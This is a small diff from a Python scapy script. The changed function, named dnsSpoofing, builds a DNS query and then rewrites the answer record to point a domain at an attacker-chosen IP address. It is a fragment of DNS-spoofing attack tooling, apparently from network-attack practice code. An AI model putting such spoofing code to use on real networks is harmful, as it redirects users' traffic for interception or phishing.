@@ -25,7 +25,7 @@ def makeARPRequest(ip):
     return answered, unanswered
 
 def dnsSpoofing(targetIP, spoofIP,sourceIP):
-    packet = scapy.IP(dst=targetIP,src=sourceIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='www.google.com'))
+    packet = scapy.IP(dst=targetIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='www.google.com'))
     answer = scapy.sr1(packet)
     answer[scapy.DNS].an = scapy.DNSRR(rrname=answer[scapy.DNSQR].qname, ttl=10, rdata=spoofIP)
     answer[scapy.DNS].ancount = 1
